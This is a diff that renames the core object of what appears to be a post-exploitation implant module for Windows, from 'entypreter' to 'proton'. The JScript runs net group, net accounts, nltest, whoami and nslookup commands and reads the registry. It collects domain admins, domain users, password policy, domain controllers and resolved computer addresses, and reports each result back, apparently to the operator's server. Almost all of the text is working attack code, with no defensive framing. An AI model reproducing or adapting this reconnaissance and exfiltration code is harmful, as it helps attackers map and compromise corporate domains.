@@ -70,7 +70,7 @@ function ResolveHostnames(hostnames)
         {
             continue;
         }
-        var nsresults = entypreter.shell.exec("nslookup "+computers[i], "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+        var nsresults = proton.shell.exec("nslookup "+computers[i], "~DIRECTORY~\\"+proton.uuid()+".txt");
         try
         {
             var ip = nsresults.split("Name:")[1].split("Address:")[1].split("\r\n")[0];
@@ -78,7 +78,7 @@ function ResolveHostnames(hostnames)
         }
         catch(e)
         {
-            var pingresults = entypreter.shell.exec("ping -4 -n 1 "+computers[i], "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+            var pingresults = proton.shell.exec("ping -4 -n 1 "+computers[i], "~DIRECTORY~\\"+proton.uuid()+".txt");
             try
             {
                 var ip = pingresults.split("[")[1].split("]")[0];
@@ -116,7 +116,7 @@ function findFQDN()
 
     try
     {
-        fqdn = entypreter.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain");
+        fqdn = proton.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain");
         return fqdn;
     }
     catch (e)
@@ -124,7 +124,7 @@ function findFQDN()
 
     try
     {
-        fqdn = entypreter.shell.exec("echo %userdnsdomain%", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+        fqdn = proton.shell.exec("echo %userdnsdomain%", "~DIRECTORY~\\"+proton.uuid()+".txt");
         if (fqdn.split(" \r\n")[0] != "%userdnsdomain%")
         {
             return fqdn.split(" \r\n")[0];
@@ -136,7 +136,7 @@ function findFQDN()
     try
     {
         fqdn = "";
-        fqdnwhole = entypreter.shell.exec("whoami /fqdn", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+        fqdnwhole = proton.shell.exec("whoami /fqdn", "~DIRECTORY~\\"+proton.uuid()+".txt");
         if (fqdnwhole.split(":")[0] != "ERROR")
         {
             var fqdnparts = fqdnwhole.split(",");
@@ -153,7 +153,7 @@ function findFQDN()
     catch (e)
     {}
 
-    entypreter.work.report("NoDomain");
+    proton.work.report("NoDomain");
     throw true;
 }
 
@@ -165,41 +165,41 @@ try
 
     var headers = {};
     headers["Header"] = "Key";
-    entypreter.work.report(fqdn + "___" + netbios, headers);
+    proton.work.report(fqdn + "___" + netbios, headers);
 
-    var domain_admins = ParseUsers(entypreter.shell.exec("net group \"Domain Admins\" /domain", "~DIRECTORY~\\"+entypreter.uuid()+".txt"));
+    var domain_admins = ParseUsers(proton.shell.exec("net group \"Domain Admins\" /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
     headers["Header"] = "Admins";
-    entypreter.work.report(domain_admins, headers);
+    proton.work.report(domain_admins, headers);
 
-    var domain_users = ParseUsers(entypreter.shell.exec("net group \"Domain Users\" /domain", "~DIRECTORY~\\"+entypreter.uuid()+".txt"));
+    var domain_users = ParseUsers(proton.shell.exec("net group \"Domain Users\" /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
     headers["Header"] = "Users";
-    entypreter.work.report(domain_users, headers);
+    proton.work.report(domain_users, headers);
 
-    var password_policy = ParsePasswordPolicy(entypreter.shell.exec("net accounts /domain", "~DIRECTORY~\\"+entypreter.uuid()+".txt"));
+    var password_policy = ParsePasswordPolicy(proton.shell.exec("net accounts /domain", "~DIRECTORY~\\"+proton.uuid()+".txt"));
     headers["Header"] = "PassPolicy";
-    entypreter.work.report(password_policy, headers);
+    proton.work.report(password_policy, headers);
 
-    var check_nltest_exist = entypreter.shell.exec("nltest /?", "~DIRECTORY~\\"+entypreter.uuid()+".txt");
+    var check_nltest_exist = proton.shell.exec("nltest /?", "~DIRECTORY~\\"+proton.uuid()+".txt");
     if (check_nltest_exist.indexOf("not recognized") == -1)
     {
-        var domain_controllers = ParseDomainControllers(entypreter.shell.exec("nltest /dnsgetdc:"+fqdn, "~DIRECTORY~\\"+entypreter.uuid()+".txt"));
+        var domain_controllers = ParseDomainControllers(proton.shell.exec("nltest /dnsgetdc:"+fqdn, "~DIRECTORY~\\"+proton.uuid()+".txt"));
         headers["Header"] = "DomainControllers";
-        entypreter.work.report(domain_controllers, headers);
+        proton.work.report(domain_controllers, headers);
     }
 
     var domain_computers = ParseDomainComputers();
     headers["Header"] = "DomainComputers";
-    entypreter.work.report(domain_computers, headers);
+    proton.work.report(domain_computers, headers);
 
     var resolved_computers = ResolveHostnames(domain_computers);
     headers["Header"] = "ResolvedComputers";
-    entypreter.work.report(resolved_computers, headers);
+    proton.work.report(resolved_computers, headers);
 
-    entypreter.work.report("Complete");
+    proton.work.report("Complete");
 
 }
 catch(e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
-entypreter.exit();
+proton.exit();
